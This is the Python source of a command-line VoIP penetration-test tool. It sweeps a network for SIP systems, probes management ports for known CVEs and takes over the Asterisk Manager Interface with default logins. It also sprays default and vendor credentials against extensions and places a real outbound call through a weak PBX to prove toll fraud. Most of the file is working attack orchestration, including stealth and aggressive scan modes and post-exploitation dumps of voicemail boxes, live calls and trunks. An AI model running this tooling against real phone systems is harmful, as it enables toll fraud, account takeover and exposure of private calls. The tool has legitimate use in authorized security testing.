#!/usr/bin/env python3
"""voip_demo.py — Point, shoot, prove it.

Given a target network and your own mobile number, this tool:
  1. Finds VoIP systems
  2. Enumerates extensions
  3. Tries anonymous INVITE + default credentials
  4. On the FIRST weakness found, places a REAL call to your mobile
     (phone rings, you answer, hear an audio message, we hang up).

Use ONLY on networks you're authorized to test. Requires --scope-file.
"""
from __future__ import annotations

import argparse
import getpass
import os
import sys
import time
from dataclasses import asdict

from modules import (audio, auth_test, call_test, dial_plan, discovery,
                     enumeration, live_call, reporter, vuln_probes)
from modules.utils import TrafficLog, hash_file, severity_score


BANNER = r"""
  __      __   ___ ____    ____
  \ \    / /__|_ _|  _ \  |  _ \  ___ _ __ ___   ___
   \ \  / / _ \| || |_) | | | | |/ _ \ '_ ` _ \ / _ \
    \ \/ / (_) | ||  __/  | |_| |  __/ | | | | | (_) |
     \__/ \___/___|_|     |____/ \___|_| |_| |_|\___/

  VoIP Live-Call Pentest Demo  |  Authorized use only
"""


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Point-and-shoot VoIP exploitation demo: scan, find a "
                    "weak extension, place a real call to your mobile.",
    )
    p.add_argument("--target", required=True,
                   help="IP, CIDR, or hostname")
    p.add_argument("--ring", required=True, dest="call_to",
                   help="Number to call (your mobile, E.164 recommended)")
    p.add_argument("--scope-file", required=True,
                   help="Path to signed authorization document")
    p.add_argument("--operator",
                   help="Name/handle recorded in report (defaults to $USER)")
    p.add_argument("--i-have-authorization", action="store_true",
                   help="Skip interactive auth prompt (still requires --scope-file)")

    p.add_argument("--hold", type=float, default=1800.0,
                   help="Max seconds to stay connected after answer "
                        "(default 1800 = 30 min). The call ALWAYS ends early "
                        "the moment you hang up your mobile — this is just a "
                        "safety cap. Use 0 to wait indefinitely (capped at 1 h).")
    p.add_argument("--audio-file",
                   help="WAV file to play (8 kHz mono 16-bit PCM)")
    p.add_argument("--audio-message", default=audio.DEFAULT_MESSAGE,
                   help="Text spoken via TTS when no --audio-file given")
    p.add_argument("--caller-id-name", default="Pentest Demo",
                   help="Display-name used in SIP From header")

    p.add_argument("--dial-prefix", default=None,
                   help="Force a specific outside-line / international prefix "
                        "before the ring number (e.g. '9', '900', '9011'). "
                        "If omitted, the tool auto-probes common prefixes.")
    p.add_argument("--no-dialplan-probe", action="store_true",
                   help="Skip dial-plan auto-probing (use --ring as-is).")

    p.add_argument("--dtmf", default=None,
                   help="DTMF sequence to send after answer, before audio. "
                        "Supports digits [0-9*#A-D] and pauses like 'p500'. "
                        "Example: '0' (press 0 for operator), '01234#' "
                        "(enter PIN + hash), 'p1000,9' (wait 1s then dial 9).")
    p.add_argument("--dtmf-digit-ms", type=int, default=200,
                   help="DTMF digit duration in ms (default 200)")
    p.add_argument("--record", action="store_true", default=True,
                   help="Record received audio to WAV in report dir (default on)")
    p.add_argument("--no-record", dest="record", action="store_false",
                   help="Disable call recording")
    p.add_argument("--record-path", default=None,
                   help="Explicit path for the call recording WAV "
                        "(default: <report-dir>/call.wav)")
    p.add_argument("--vendor-creds", action="store_true", default=True,
                   help="Include vendor-specific credential list based on "
                        "the detected PBX fingerprint (default on)")
    p.add_argument("--no-vendor-creds", dest="vendor_creds",
                   action="store_false",
                   help="Only use the generic credential list")
    p.add_argument("--probe-vulns", action="store_true", default=True,
                   help="Run CVE-targeted HTTP probes against discovered "
                        "management surfaces (default on)")
    p.add_argument("--no-probe-vulns", dest="probe_vulns",
                   action="store_false", help="Skip vulnerability probes")

    p.add_argument("--ext-range",
                   help="Override auto-enumeration with a specific range/list: "
                        "1000-1099 | 100,200 | file:path.txt. If omitted, "
                        "the tool auto-discovers extensions (AMI pwn + "
                        "fingerprint-aware adaptive sweep + aliases).")
    p.add_argument("--skip-ami", action="store_true",
                   help="Skip Asterisk Manager Interface attack in auto-enum")
    p.add_argument("--skip-specials", action="store_true",
                   help="Skip probing of alias extensions (operator, *43, etc.)")
    p.add_argument("--ami-port", type=int, default=5038,
                   help="Asterisk Manager port (default 5038)")
    p.add_argument("--coarse-step", type=int, default=10,
                   help="Step size for adaptive sweep coarse pass (default 10)")
    p.add_argument("--fill-radius", type=int, default=9,
                   help="Fill ±N around each coarse hit (default 9)")
    p.add_argument("--cred-file",
                   default=os.path.join(os.path.dirname(__file__),
                                        "wordlists/default_credentials.txt"))
    p.add_argument("--skip-creds", action="store_true",
                   help="Skip credential spraying (only test anon paths)")
    p.add_argument("--stop-at-first", action="store_true", default=True,
                   help="Stop at the first successful call (default)")
    p.add_argument("--all-paths", action="store_true",
                   help="Test every weak path, not just the first")

    p.add_argument("--mode", choices=["standard", "aggressive", "stealth"],
                   default="standard",
                   help="Scan intensity preset. Overridden by any explicit flag.\n"
                        "  standard   = balanced (50 pps, default ranges, default creds)\n"
                        "  aggressive = fast (500 pps, full 100-9999 sweep, all vendor creds,\n"
                        "                all vuln probes, lower timeout)\n"
                        "  stealth    = quiet (5 pps, skip AMI, skip vuln probes,\n"
                        "                wider adaptive coarse step)")
    p.add_argument("--rate", type=float, default=None,
                   help="SIP packets per second. Default depends on --mode.")
    p.add_argument("--timeout", type=float, default=None,
                   help="Socket timeout (s). Default depends on --mode.")
    p.add_argument("--workers", type=int, default=16)
    p.add_argument("--port", type=int, default=5060)
    p.add_argument("--report-dir")
    p.add_argument("--dry-ring", action="store_true",
                   help="Go through the whole flow but don't actually place the call")
    args = p.parse_args()
    _apply_mode_preset(args)
    return args


def _apply_mode_preset(args: argparse.Namespace) -> None:
    """Fill in sensible defaults based on --mode, without overriding any
    explicit user setting. Called right after argparse."""
    if args.mode == "aggressive":
        if args.rate is None:          args.rate = 500.0
        if args.timeout is None:       args.timeout = 1.5
        if not args.ext_range:         args.ext_range = "100-9999"
        # Aggressive always uses vendor creds and vuln probes (already default on)
        args.vendor_creds = True
        args.probe_vulns = True
    elif args.mode == "stealth":
        if args.rate is None:          args.rate = 5.0
        if args.timeout is None:       args.timeout = 2.5
        args.skip_ami = True
        args.probe_vulns = False
        args.coarse_step = max(args.coarse_step, 20)
    else:  # standard
        if args.rate is None:          args.rate = 50.0
        if args.timeout is None:       args.timeout = 3.0


def authorize(args: argparse.Namespace) -> tuple[str, str]:
    if not os.path.exists(args.scope_file):
        print(f"ERROR: scope file not found: {args.scope_file}", file=sys.stderr)
        sys.exit(2)
    scope_hash = hash_file(args.scope_file)
    operator = args.operator or getpass.getuser()
    if args.i_have_authorization:
        return operator, scope_hash
    print("")
    print("LIVE-CALL AUTHORIZATION REQUIRED")
    print("-" * 60)
    print(f"  Operator       : {operator}")
    print(f"  Target         : {args.target}")
    print(f"  Scope file     : {args.scope_file}")
    print(f"  Scope sha256   : {scope_hash}")
    print(f"  Ring number    : {args.call_to}")
    print(f"  Hold seconds   : {args.hold}")
    print(f"  Dry ring       : {args.dry_ring}")
    print("")
    print("Confirm: (a) scope document is signed, (b) the ring number is one")
    print("you own, and (c) the PBX owner accepts that their phone may carry")
    print("a real outbound call during this test.")
    ans = input("Type 'yes' to proceed: ").strip().lower()
    if ans != "yes":
        print("Aborted.")
        sys.exit(1)
    return operator, scope_hash


def summarize_step(label: str, body: str) -> None:
    bar = "─" * 60
    print(f"\n{bar}\n {label}\n{bar}")
    print(body)


def main() -> int:
    print(BANNER)
    args = parse_args()
    operator, scope_sha = authorize(args)

    stamp = time.strftime("%Y%m%d-%H%M%S")
    report_dir = args.report_dir or os.path.join("reports", f"demo-{stamp}")
    os.makedirs(report_dir, exist_ok=True)
    traffic_log = TrafficLog(os.path.join(report_dir, "traffic.log"))

    # ---- Build audio payload once (reused if we find multiple weak paths) ----
    audio_loop_cap = args.hold if args.hold > 0 else 3600
    payload = audio.build_payload(
        wav_file=args.audio_file,
        message=args.audio_message,
        loop_to_seconds=audio_loop_cap,
    )
    audio_label = payload["label"]
    summarize_step(
        "AUDIO PAYLOAD PREPARED",
        f"  Source : {audio_label}\n"
        f"  PCMU   : {len(payload['PCMU'])} bytes  "
        f"(~{len(payload['PCMU'])/8000:.1f}s @ 8kHz)\n"
        f"  PCMA   : {len(payload['PCMA'])} bytes  "
        f"(same samples in A-law for European PBXes)",
    )

    # ---- Phase 1: discover ----
    targets = discovery.expand_target(args.target)
    if not targets:
        print(f"ERROR: could not resolve target: {args.target}", file=sys.stderr)
        return 2
    summarize_step(
        "PHASE 1 — DISCOVERY",
        f"  Sweeping {len(targets)} host(s) for SIP/VoIP services...",
    )
    hosts = discovery.sweep(
        targets, timeout=args.timeout, rate_per_second=args.rate,
        workers=args.workers, traffic_log=traffic_log,
    )
    print(f"  Found {len(hosts)} host(s) with VoIP evidence.")
    for h in hosts:
        server = (h.sip or {}).get("server", "") if h.sip else ""
        pbx = enumeration.fingerprint(server)
        print(f"    {h.ip:<18} {pbx:<14} {server[:40]}")
    if not hosts:
        summarize_step("NO VOIP FOUND",
                       "  No SIP/VoIP services responded. Nothing to demo.")
        traffic_log.close()
        return 0

    host_reports: list[dict] = []
    demo_call_result: dict | None = None
    all_vuln_findings: list[dict] = []

    for h in hosts:
        hr = {
            "ip": h.ip,
            "open_ports": h.open_ports,
            "sip": h.sip,
            "pbx_fingerprint": enumeration.fingerprint(
                (h.sip or {}).get("server", "") if h.sip else ""
            ),
            "extensions": [],
            "credentials_found": [],
            "vuln_findings": [],
            "call_test": None,   # signaling-only field (unused here)
            "live_call": None,   # the real demo call
        }

        # ---- Phase 1b: CVE-targeted HTTP probes against management surfaces ----
        if args.probe_vulns:
            http_ports = sorted({p["port"] for p in h.open_ports
                                 if p["proto"] == "tcp"})
            if http_ports:
                print(f"\n  Probing {h.ip} for known vulnerabilities on "
                      f"ports {http_ports}...")
                vulns = vuln_probes.run_all(h.ip, http_ports, timeout=args.timeout)
                for v in vulns:
                    hr["vuln_findings"].append({
                        "name": v.name, "severity": v.severity,
                        "target": v.target, "title": v.title,
                        "evidence": v.evidence, "remediation": v.remediation,
                    })
                    all_vuln_findings.append(hr["vuln_findings"][-1])
                    print(f"    [{v.severity.upper():8}] {v.name}  {v.title}")
                if not vulns:
                    print("    (no known-bad endpoints detected)")

        if not h.sip:
            host_reports.append(hr)
            continue

        # ---- Phase 2: AUTO-DISCOVER real extensions (no wordlist guessing) ----
        fingerprint = hr["pbx_fingerprint"]
        ami_hint = any(
            p["service"] == "Asterisk-AMI" for p in h.open_ports
        ) and not args.skip_ami

        if args.ext_range:
            # User explicitly overrode auto-enum with a specific range/list
            ext_list = enumeration.expand_ext_range(args.ext_range)
            summarize_step(
                f"PHASE 2 — EXTENSION ENUMERATION  ({h.ip})",
                f"  Mode: user-supplied range\n"
                f"  Fingerprint: {fingerprint}\n"
                f"  Candidates : {len(ext_list)}",
            )
            swept = enumeration.enumerate_range(
                h.ip, ext_list, port=args.port, method="REGISTER",
                timeout=args.timeout, rate_per_second=args.rate,
                traffic_log=traffic_log,
            )
            # Also INVITE-probe to catch anon-call acceptance
            invite_map = enumeration.probe_extensions_invite(
                h.ip, [r.extension for r in swept],
                port=args.port, timeout=args.timeout,
                rate_per_second=args.rate, traffic_log=traffic_log,
            )
            for r in swept:
                inv = invite_map.get(r.extension)
                if inv:
                    r.anonymous_invite = r.anonymous_invite or inv.anonymous_invite
                    r.open_register = r.open_register or inv.open_register
                    r.auth_required = r.auth_required and inv.auth_required
            found = swept
            hr["auto_enum"] = {
                "method": "manual",
                "ami_attempted": False, "ami_success": False,
                "ranges": [], "specials": [],
            }
        else:
            auto = enumeration.auto_enumerate(
                h.ip, port=args.port,
                fingerprint=fingerprint,
                try_ami=ami_hint,
                ami_port=args.ami_port,
                include_specials=not args.skip_specials,
                coarse_step=args.coarse_step,
                fill_radius=args.fill_radius,
                timeout=args.timeout,
                rate_per_second=args.rate,
                traffic_log=traffic_log,
            )
            found = auto.extensions
            hr["auto_enum"] = {
                "method": auto.method,
                "ami_attempted": ami_hint,
                "ami_success": bool(auto.ami and auto.ami.success),
                "ami_creds": (f"{auto.ami.username}:{auto.ami.password}"
                              if auto.ami and auto.ami.success else ""),
                "ranges": [f"{a}-{b}" for a, b in auto.ranges_probed],
                "specials": auto.specials_probed,
            }
            details = (
                f"  Mode        : {auto.method}\n"
                f"  Fingerprint : {fingerprint}\n"
                f"  AMI port    : {args.ami_port} "
                + (f"(open, tried defaults)" if ami_hint else "(not open/skipped)")
                + "\n"
            )
            if auto.ami and auto.ami.success:
                details += (
                    f"  AMI pwned   : ✓ as {auto.ami.username}:{auto.ami.password}\n"
                    f"  AMI dump    : {len(auto.ami.extensions)} peers/endpoints\n"
                )
                if auto.ami.voicemail_boxes:
                    details += (f"  Voicemail   : {len(auto.ami.voicemail_boxes)} "
                                f"box(es) disclosed\n")
                if auto.ami.active_channels:
                    details += (f"  Live calls  : {len(auto.ami.active_channels)} "
                                f"channel(s) in progress right now\n")
                if auto.ami.sip_registrations:
                    details += (f"  SIP trunks  : {len(auto.ami.sip_registrations)} "
                                f"outbound registration(s) visible\n")
                hr["ami_post_exploit"] = {
                    "voicemail": auto.ami.voicemail_boxes,
                    "channels": auto.ami.active_channels,
                    "registrations": auto.ami.sip_registrations,
                }
            details += (
                f"  Ranges      : {', '.join(f'{a}-{b}' for a,b in auto.ranges_probed)}\n"
                f"  Specials    : {len(auto.specials_probed)} alias(es) probed\n"
                f"  Found       : {len(found)} live extension(s)"
            )
            summarize_step(f"PHASE 2 — AUTO-ENUMERATION  ({h.ip})", details)

        hr["extensions"] = [asdict(x) for x in found]
        for f in found:
            flags = []
            if f.anonymous_invite: flags.append("ANON-INVITE")
            if f.open_register:    flags.append("OPEN-REGISTER")
            if f.auth_required:    flags.append("auth-required")
            print(f"    ext {f.extension:<12} [{','.join(flags) or 'exists'}]")

        # ---- Phase 3: credential spray (only if enabled) ----
        if not args.skip_creds:
            # Build the cred list: user-supplied file + vendor-specific
            # vendor list if fingerprint matched (e.g. Cisco/Polycom/Avaya)
            cred_sources = [args.cred_file]
            if args.vendor_creds:
                wl_dir = os.path.dirname(args.cred_file)
                vendor_files = enumeration.cred_files_for_fingerprint(
                    fingerprint, wl_dir)
                for vf in vendor_files:
                    if vf not in cred_sources:
                        cred_sources.append(vf)
            creds: list[tuple[str, str]] = []
            for src in cred_sources:
                try:
                    creds.extend(auth_test.load_credentials(src))
                except OSError:
                    pass
            # Deduplicate while preserving order
            seen: set = set()
            creds = [(u, p) for u, p in creds
                     if (u, p) not in seen and not seen.add((u, p))]
            auth_targets = [e.extension for e in found if e.auth_required]
            summarize_step(
                f"PHASE 3 — CREDENTIAL SPRAY  ({h.ip})",
                f"  {len(creds)} cred pairs vs {len(auth_targets)} "
                f"auth-required extension(s)\n"
                f"  Sources: {', '.join(os.path.basename(s) for s in cred_sources)}",
            )
            spray = auth_test.spray(
                h.ip, auth_targets, creds,
                port=args.port, timeout=args.timeout,
                rate_per_second=max(2.0, args.rate / 10),
                traffic_log=traffic_log,
            )
            hits = [asdict(c) for c in spray if c.success]
            hr["credentials_found"] = hits
            for c in hits:
                print(f"    CRED  {c['extension']}  "
                      f"{c['username']}:{c['password']}  ({c['evidence']})")

        # ---- Phase 4: per-extension attack matrix, then pick & RING ----
        attack_paths = _rank_paths(hr)
        matrix = _attack_matrix(hr)
        summarize_step(
            f"PHASE 4 — ATTACK MATRIX  ({h.ip})",
            matrix + "\n"
            + (f"  {len(attack_paths)} weak path(s) ranked:\n"
               + "\n".join(f"    [rank {p['rank']}] {p['label']}"
                           for p in attack_paths)
               if attack_paths else "  No weak paths — skipping ring."),
        )
        if not attack_paths:
            host_reports.append(hr)
            continue

        live_results: list[dict] = []
        for path in attack_paths:
            if args.dry_ring:
                print(f"  [DRY-RING] would call {args.call_to} via "
                      f"{path['extension']}  ({path['label']})")
                live_results.append({**path, "dry_ring": True})
                continue
            # ---- Dial-plan probe: find the right outside-line / intl prefix ----
            dial_target = args.call_to
            probe_table = ""
            if args.dial_prefix:
                dial_target = args.dial_prefix + args.call_to.lstrip("+")
                probe_table = (
                    f"  Dial-plan  : user-supplied prefix {args.dial_prefix!r} "
                    f"→ target {dial_target!r}\n"
                )
            elif not args.no_dialplan_probe:
                print(f"  Probing dial-plan prefixes for {args.call_to}...")
                winner, probes = dial_plan.find_working_prefix(
                    h.ip, args.call_to,
                    pbx_port=args.port,
                    from_user=path["extension"],
                    timeout=1.5,
                    rate_per_second=20,
                    traffic_log=traffic_log,
                )
                probe_table = dial_plan.format_probe_table(probes) + "\n"
                if winner:
                    dial_target = winner
                    probe_table += (
                        f"  ✓ Winning format: {winner!r} "
                        f"(after {len(probes)} probe(s))\n"
                    )
                else:
                    probe_table += (
                        f"  ! No candidate routed. Falling back to "
                        f"{args.call_to!r} as supplied.\n"
                    )
            summarize_step(
                f"PHASE 5 — PLACING LIVE CALL  ({h.ip} → {dial_target})",
                probe_table +
                f"  Via extension: {path['extension']}\n"
                f"  Path         : {path['label']}\n"
                f"  Max hold     : {args.hold}s "
                f"({'indefinite up to 1h' if args.hold <= 0 else 'safety cap'})\n"
                f"  Audio        : {audio_label} (PCMU+PCMA ready)\n"
                f"  Caller-ID    : {args.caller_id_name}\n"
                f"  Your mobile  : {args.call_to}\n"
                f"\n"
                f"  Dialling now. You end the call whenever you want by any of:\n"
                f"    1. Hang up your mobile      (preferred — natural demo end)\n"
                f"    2. Press Ctrl+C in terminal (graceful BYE sent)\n"
                f"    3. Let {int(max(args.hold,1))}s elapse (auto end)",
            )

            # Callbacks — keep the operator informed during the live call.
            def on_answered(remote_media, effective_hold):
                mins = int(effective_hold // 60)
                secs = int(effective_hold % 60)
                print("\n  " + "━" * 56)
                print(f"  ▶ CALL ANSWERED  ({remote_media.codec} to "
                      f"{remote_media.ip}:{remote_media.port})")
                print(f"  ▶ YOU ARE IN CONTROL. Hang up your mobile to end.")
                print(f"  ▶ Auto-end after {mins}m{secs:02d}s if you forget.")
                print("  " + "━" * 56 + "\n")

            def on_heartbeat(elapsed_s, max_hold_s, pkts):
                rem = max(0, max_hold_s - elapsed_s)
                print(f"  … call active {int(elapsed_s):>4}s elapsed  "
                      f"{int(rem):>4}s until auto-end  "
                      f"RTP packets: {pkts}")

            # Build record path if recording enabled
            rec_path = None
            if args.record:
                rec_path = args.record_path or os.path.join(
                    report_dir, f"call_{h.ip.replace('.','_')}_"
                                f"{path['extension']}.wav")
            result = live_call.place_live_call(
                pbx_host=h.ip,
                call_to=dial_target,
                call_from=path["extension"],
                audio_payload=payload,
                audio_label=audio_label,
                pbx_port=args.port,
                username=path.get("username"),
                password=path.get("password"),
                hold_seconds=args.hold,
                timeout=args.timeout,
                traffic_log=traffic_log,
                caller_id_name=args.caller_id_name,
                on_answered=on_answered,
                on_heartbeat=on_heartbeat,
                dtmf_sequence=args.dtmf,
                dtmf_digit_ms=args.dtmf_digit_ms,
                record_path=rec_path,
            )
            entry = {
                **path,
                "call_to": args.call_to,
                "success": result.success,
                "status_code": result.status_code,
                "reason": result.reason,
                "codec": result.codec,
                "duration_s": round(result.duration_s, 2),
                "rtp_packets_sent": result.rtp_packets_sent,
                "audio_source": result.audio_source,
                "hangup_side": result.hangup_side,
                "evidence": result.evidence,
                "trace": result.sip_trace,
                "dtmf_sent": result.dtmf_sent,
                "recording": result.recording,
            }
            live_results.append(entry)
            status = "ANSWERED" if result.success else f"FAILED ({result.reason})"
            print(f"  Result: {status}")
            for ln in result.sip_trace[-6:]:
                print(f"    {ln}")
            if result.success:
                demo_call_result = {"pbx": h.ip, **entry}
                if args.stop_at_first and not args.all_paths:
                    break
        hr["live_call"] = live_results
        host_reports.append(hr)

        if demo_call_result and args.stop_at_first and not args.all_paths:
            break

    # ---- Report ----
    report = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "operator": operator,
        "target": args.target,
        "scope_file": args.scope_file,
        "scope_sha256": scope_sha,
        "args": {k: v for k, v in vars(args).items()},
        "audio_source": audio_label,
        "hosts": host_reports,
        "demo_call": demo_call_result,
    }
    report["severity_counts"] = {}
    paths_out = reporter.write_all(report_dir, report)
    report["severity_counts"] = severity_score(report["findings"])
    paths_out = reporter.write_all(report_dir, report)
    traffic_log.close()

    summarize_step("FINAL SUMMARY", _final_summary(report))
    print("\nReports written to:", report_dir)
    for k, pth in paths_out.items():
        print(f"  {k:<4} : {pth}")
    print(f"  traffic log: {os.path.join(report_dir, 'traffic.log')}")
    return 0


def _attack_matrix(host_report: dict) -> str:
    """Render a table of extension × attack path for the report / console."""
    exts = host_report.get("extensions", [])
    creds_by_ext: dict[str, dict] = {
        c["extension"]: c for c in host_report.get("credentials_found", [])
    }
    if not exts:
        return "  (no extensions discovered)"
    # Header
    header = f"  {'Extension':<14} {'Anon-INVITE':<12} {'Open-REG':<10} {'Weak Creds':<24}"
    sep = "  " + "─" * (14 + 12 + 10 + 24)
    rows = [header, sep]
    # Sort numerics first by length then value; non-numerics alphabetical
    def _key(e: dict) -> tuple:
        ext = e["extension"]
        if ext.isdigit():
            return (0, len(ext), int(ext))
        return (1, 99, ext)
    for e in sorted(exts, key=_key):
        ext = e["extension"]
        anon = "✓" if e.get("anonymous_invite") else "·"
        openr = "✓" if e.get("open_register") else "·"
        if ext in creds_by_ext:
            c = creds_by_ext[ext]
            weak = f"✓ {c['username']}:{c['password']}"[:22]
        else:
            weak = "·"
        rows.append(f"  {ext:<14} {anon:<12} {openr:<10} {weak:<24}")
    return "\n".join(rows)


def _rank_paths(host_report: dict) -> list[dict]:
    """Rank attack paths by likelihood-of-success:
       1) anonymous INVITE (zero auth), 2) open-register, 3) discovered creds."""
    paths: list[dict] = []
    for e in host_report["extensions"]:
        if e.get("anonymous_invite"):
            paths.append({
                "rank": 1, "extension": e["extension"],
                "label": f"anonymous INVITE accepted for ext {e['extension']}",
            })
    for e in host_report["extensions"]:
        if e.get("open_register"):
            paths.append({
                "rank": 2, "extension": e["extension"],
                "label": f"open REGISTER for ext {e['extension']} (no auth needed)",
            })
    for c in host_report["credentials_found"]:
        paths.append({
            "rank": 3, "extension": c["extension"],
            "username": c["username"], "password": c["password"],
            "label": f"weak creds {c['username']}:{c['password']} on ext {c['extension']}",
        })
    paths.sort(key=lambda p: p["rank"])
    return paths


def _final_summary(report: dict) -> str:
    dc = report.get("demo_call")
    if dc and dc.get("success"):
        return (
            f"  ✓ TOLL-FRAUD RISK CONFIRMED\n"
            f"    PBX           : {dc['pbx']}\n"
            f"    Via extension : {dc['extension']}\n"
            f"    Attack path   : {dc['label']}\n"
            f"    Called number : {dc['call_to']}\n"
            f"    Call answered : {dc['duration_s']}s,  codec={dc['codec']}\n"
            f"    RTP sent      : {dc['rtp_packets_sent']} packets\n"
            f"    Hang-up       : {dc['hangup_side']}\n\n"
            f"  The client should see this call in their CDR. Handing over report."
        )
    hits = sum(1 for h in report["hosts"]
               if h.get("credentials_found")
               or any(e.get("anonymous_invite") or e.get("open_register")
                      for e in h.get("extensions", [])))
    if hits:
        return (f"  Weak paths identified on {hits} host(s) but no call completed.\n"
                f"  Check report.html for details and retry with --dry-ring off.")
    return "  No weak paths found. The targets may be hardened, or scope narrow.\n  Consider expanding extension range with --ext-range."


if __name__ == "__main__":
    sys.exit(main())
